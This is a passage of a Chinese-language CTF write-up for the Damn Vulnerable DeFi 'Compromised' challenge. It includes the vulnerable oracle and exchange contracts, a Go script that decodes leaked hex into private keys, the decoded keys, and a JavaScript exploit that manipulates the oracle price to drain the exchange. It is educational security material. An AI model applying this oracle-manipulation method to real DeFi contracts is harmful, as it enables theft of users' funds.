function_">send</span>(<span class="string">&quot;evm_increaseTime&quot;</span>, [<span class="number">2</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>]);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">attack</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">complete</span>();</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<p>首先构造data，调用loan函数后，在区块上渡过两天的时间，即可调用complete函数完成攻击。<br><img src="https://img-blog.csdnimg.cn/ac027ba6726742d8821b08eb1a12d84d.png" alt="在这里插入图片描述"></p>
<p>执行脚本完成攻击。</p>
<h1 id="Compromised"><a href="#Compromised" class="headerlink" title="Compromised"></a>Compromised</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目要求：</p>
<blockquote>
<p>While poking around a web service of one of the most popular DeFi<br>projects in the space, you get a somewhat strange response from their<br>server. This is a snippet:</p>
</blockquote>
<pre><code>      HTTP/2 200 OK
      content-type: text/html
      content-language: en
      vary: Accept-Encoding
      server: cloudflare

      4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

      4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
    
</code></pre>
<blockquote>
<p>A related on-chain exchange is selling (absurdly overpriced)<br>collectibles called “DVNFT”, now at 999 ETH each</p>
<p>This price is fetched from an on-chain oracle, and is based on three<br>trusted reporters:<br>0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15<br>and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.</p>
<p>Starting with only 0.1 ETH in balance, you must steal all ETH<br>available in the exchange.</p>
</blockquote>
<p>大意是有一个交易所在售卖一种非常昂贵的代币DVNFT，每个价值999ETH，要我们以0.1ETH的余额来拿走交易所中全部的ETH<br>预言机合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/AccessControlEnumerable.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">TrustfulOracle</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@notice</span> A price oracle with a number of trusted sources that individually report prices for symbols.</span></span><br><span class="line"><span class="comment"> *         The oracle&#x27;s price for a given symbol is the median price of the symbol over all sources.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">TrustfulOracle</span> is <span class="title class_">AccessControlEnumerable</span> &#123;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant <span class="variable constant_">TRUSTED_SOURCE_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;TRUSTED_SOURCE_ROLE&quot;</span>);</span><br><span class="line">    bytes32 public constant <span class="variable constant_">INITIALIZER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;INITIALIZER_ROLE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source address =&gt; (symbol =&gt; price)</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">string</span> =&gt;</span> uint256)) private pricesBySource;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyTrustedSource</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">TRUSTED_SOURCE_ROLE</span>, msg.<span class="property">sender</span>));</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyInitializer</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">INITIALIZER_ROLE</span>, msg.<span class="property">sender</span>));</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">UpdatedPrice</span>(</span><br><span class="line">        address indexed source,</span><br><span class="line">        string indexed symbol,</span><br><span class="line">        uint256 oldPrice,</span><br><span class="line">        uint256 newPrice</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address[] memory sources, bool enableInitialization</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(sources.<span class="property">length</span> &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint256 i = <span class="number">0</span>; i &lt; sources.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">_setupRole</span>(<span class="variable constant_">TRUSTED_SOURCE_ROLE</span>, sources[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (enableInitialization) &#123;</span><br><span class="line">            <span class="title function_">_setupRole</span>(<span class="variable constant_">INITIALIZER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A handy utility allowing the deployer to setup initial prices (only once)</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setupInitialPrices</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] memory sources,</span></span><br><span class="line"><span class="params">        string[] memory symbols,</span></span><br><span class="line"><span class="params">        uint256[] memory prices</span></span><br><span class="line"><span class="params">    </span>) </span><br><span class="line">        public</span><br><span class="line">        onlyInitializer</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Only allow one (symbol, price) per source</span></span><br><span class="line">        <span class="built_in">require</span>(sources.<span class="property">length</span> == symbols.<span class="property">length</span> &amp;&amp; symbols.<span class="property">length</span> == prices.<span class="property">length</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint256 i = <span class="number">0</span>; i &lt; sources.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">_setPrice</span>(sources[i], symbols[i], prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">renounceRole</span>(<span class="variable constant_">INITIALIZER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">postPrice</span>(<span class="params">string calldata symbol, uint256 newPrice</span>) external onlyTrustedSource &#123;</span><br><span class="line">        <span class="title function_">_setPrice</span>(msg.<span class="property">sender</span>, symbol, newPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getMedianPrice</span>(<span class="params">string calldata symbol</span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_computeMedianPrice</span>(symbol);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getAllPricesForSymbol</span>(<span class="params">string memory symbol</span>) public view returns (uint256[] memory) &#123;</span><br><span class="line">        uint256 numberOfSources = <span class="title function_">getNumberOfSources</span>();</span><br><span class="line">        uint256[] memory prices = <span class="keyword">new</span> uint256[](numberOfSources);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; numberOfSources; i++) &#123;</span><br><span class="line">            address source = <span class="title function_">getRoleMember</span>(<span class="variable constant_">TRUSTED_SOURCE_ROLE</span>, i);</span><br><span class="line">            prices[i] = <span class="title function_">getPriceBySource</span>(symbol, source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prices;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getPriceBySource</span>(<span class="params">string memory symbol, address source</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> pricesBySource[source][symbol];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getNumberOfSources</span>(<span class="params"></span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">getRoleMemberCount</span>(<span class="variable constant_">TRUSTED_SOURCE_ROLE</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_setPrice</span>(<span class="params">address source, string memory symbol, uint256 newPrice</span>) private &#123;</span><br><span class="line">        uint256 oldPrice = pricesBySource[source][symbol];</span><br><span class="line">        pricesBySource[source][symbol] = newPrice;</span><br><span class="line">        emit <span class="title class_">UpdatedPrice</span>(source, symbol, oldPrice, newPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_computeMedianPrice</span>(<span class="params">string memory symbol</span>) private view returns (uint256) &#123;</span><br><span class="line">        uint256[] memory prices = <span class="title function_">_sort</span>(<span class="title function_">getAllPricesForSymbol</span>(symbol));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate median price</span></span><br><span class="line">        <span class="keyword">if</span> (prices.<span class="property">length</span> % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            uint256 leftPrice = prices[(prices.<span class="property">length</span> / <span class="number">2</span>) - <span class="number">1</span>];</span><br><span class="line">            uint256 rightPrice = prices[prices.<span class="property">length</span> / <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">return</span> (leftPrice + rightPrice) / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> prices[prices.<span class="property">length</span> / <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_sort</span>(<span class="params">uint256[] memory arrayOfNumbers</span>) private pure returns (uint256[] memory) &#123;</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; arrayOfNumbers.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (uint256 j = i + <span class="number">1</span>; j &lt; arrayOfNumbers.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arrayOfNumbers[i] &gt; arrayOfNumbers[j]) &#123;</span><br><span class="line">                    uint256 tmp = arrayOfNumbers[i];</span><br><span class="line">                    arrayOfNumbers[i] = arrayOfNumbers[j];</span><br><span class="line">                    arrayOfNumbers[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">return</span> arrayOfNumbers;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个合约提供了与链上交易所进行交互的函数，包括根据不同的方式得到不同的价格，以及初始化价格等函数。<br>交易所合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./TrustfulOracle.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableNFT.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">Exchange</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">Exchange</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">DamnValuableNFT</span> public immutable token;</span><br><span class="line">    <span class="title class_">TrustfulOracle</span> public immutable oracle;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">TokenBought</span>(address indexed buyer, uint256 tokenId, uint256 price);</span><br><span class="line">    event <span class="title class_">TokenSold</span>(address indexed seller, uint256 tokenId, uint256 price);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address oracleAddress</span>) payable &#123;</span><br><span class="line">        token = <span class="keyword">new</span> <span class="title class_">DamnValuableNFT</span>();</span><br><span class="line">        oracle = <span class="title class_">TrustfulOracle</span>(oracleAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buyOne</span>(<span class="params"></span>) external payable nonReentrant returns (uint256) &#123;</span><br><span class="line">        uint256 amountPaidInWei = msg.<span class="property">value</span>;</span><br><span class="line">        <span class="built_in">require</span>(amountPaidInWei &gt; <span class="number">0</span>, <span class="string">&quot;Amount paid must be greater than zero&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Price should be in [wei / NFT]</span></span><br><span class="line">        uint256 currentPriceInWei = oracle.<span class="title function_">getMedianPrice</span>(token.<span class="title function_">symbol</span>());</span><br><span class="line">        <span class="built_in">require</span>(amountPaidInWei &gt;= currentPriceInWei, <span class="string">&quot;Amount paid is not enough&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 tokenId = token.<span class="title function_">safeMint</span>(msg.<span class="property">sender</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">sendValue</span>(amountPaidInWei - currentPriceInWei);</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">TokenBought</span>(msg.<span class="property">sender</span>, tokenId, currentPriceInWei);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tokenId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sellOne</span>(<span class="params">uint256 tokenId</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == token.<span class="title function_">ownerOf</span>(tokenId), <span class="string">&quot;Seller must be the owner&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">getApproved</span>(tokenId) == <span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="string">&quot;Seller must have approved transfer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Price should be in [wei / NFT]</span></span><br><span class="line">        uint256 currentPriceInWei = oracle.<span class="title function_">getMedianPrice</span>(token.<span class="title function_">symbol</span>());</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &gt;= currentPriceInWei, <span class="string">&quot;Not enough ETH in balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        token.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), tokenId);</span><br><span class="line">        token.<span class="title function_">burn</span>(tokenId);</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">sendValue</span>(currentPriceInWei);</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">TokenSold</span>(msg.<span class="property">sender</span>, tokenId, currentPriceInWei);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>合约提供了两个函数，一个用来买代币，一个用来卖代币<br>根据以上合约我们可以发现，无论是买入还是卖出，价格都由这个函数决定<br><img src="https://img-blog.csdnimg.cn/c04458224f654e9faaf8d293f1389f69.png" alt="在这里插入图片描述"><br>而这个函数能够修改Price<br><img src="https://img-blog.csdnimg.cn/d9ac73283f3f48fcb64434611d49e187.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4a6c008097d648518ea50ebe594a5631.png" alt="在这里插入图片描述"><br>而要调用这个函数，就需要调用者为trustedSource，我们知道题目给了我们三个地址，而三个地址都为trustedSource，所以我们如果能够控制这三个地址，就能够随意的更改价格，来达到我们的预期效果。</p>
<p>此时，通过解码发现，题目最开始给出的两串hex码，恰好是三个账户中其中两个的私钥，因此，我们就能够通过控制其中两个账户来达到我们的目的。</p>
<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p>私钥计算脚本：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//题目给的hex码</span></span><br><span class="line">	<span class="keyword">var</span> str = []<span class="type">string</span>&#123;<span class="string">&quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;</span>,</span><br><span class="line">						<span class="string">&quot;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&quot;</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(str); i++ &#123;</span><br><span class="line">		<span class="comment">//去除全部空格</span></span><br><span class="line">		str[i] = strings.Replace(str[i], <span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">-1</span>)</span><br><span class="line">		<span class="comment">//hex转Acsii码</span></span><br><span class="line">		message, err := hex.DecodeString(str[i])</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// base64解码消息</span></span><br><span class="line">		data, err := base64.StdEncoding.DecodeString(<span class="type">string</span>(message))</span><br><span class="line">		<span class="comment">// 出错处理</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// 打印解码完成的数据</span></span><br><span class="line">			fmt.Println(<span class="type">string</span>(data))</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>脚本结果如下<br><img src="https://img-blog.csdnimg.cn/33b8ca619b294913a44fd5c6d9a8950a.png" alt="在这里插入图片描述"><br>得到私钥后，编写js攻击代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="comment">//账户私钥</span></span><br><span class="line">        privateKey1 = <span class="string">&quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;</span></span><br><span class="line">        privateKey2 = <span class="string">&quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;</span></span><br><span class="line">        <span class="comment">//解锁账户地址</span></span><br><span class="line">        addr1 = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey1, ethers.<span class="property">provider</span>)</span><br><span class="line">        addr2 = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey2, ethers.<span class="property">provider</span>)</span><br><span class="line">        <span class="comment">//修改为最低价</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(addr1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(addr2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//买入代币</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">buyOne</span>(&#123; <span class="attr">value</span>: <span class="number">1</span> &#125;);</span><br><span class="line">        <span class="comment">//修改为最高价</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(addr1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="variable constant_">EXCHANGE_INITIAL_ETH_BALANCE</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(addr2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="variable constant_">EXCHANGE_INITIAL_ETH_BALANCE</span>);</span><br><span class="line">        <span class="comment">//卖出代币</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">nftToken</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="property">address</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">sellOne</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="comment">//将价格修改为初始价格</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(addr1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="variable constant_">INITIAL_NFT_PRICE</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(addr2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="variable constant_">INITIAL_NFT_PRICE</span>);</span><br><span class="line">    